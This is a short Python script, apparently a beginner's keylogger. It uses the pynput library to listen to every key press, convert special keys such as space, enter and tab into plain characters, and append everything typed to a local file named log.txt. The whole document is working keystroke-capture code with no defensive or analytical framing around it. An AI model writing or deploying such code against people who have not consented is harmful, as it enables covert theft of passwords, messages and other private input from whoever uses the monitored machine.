#Storing the keystrokes in a text file
from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","") #remove the inverted commas that seperate the letters

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.tab':
        letter = '\t'

    with open("log.txt", "a") as f:
        f.write(letter) #Write the letters that you press on the keyboard in the log file.

with Listener(on_press=write_to_file) as l:
    l.join() #all the keystrokes are join together

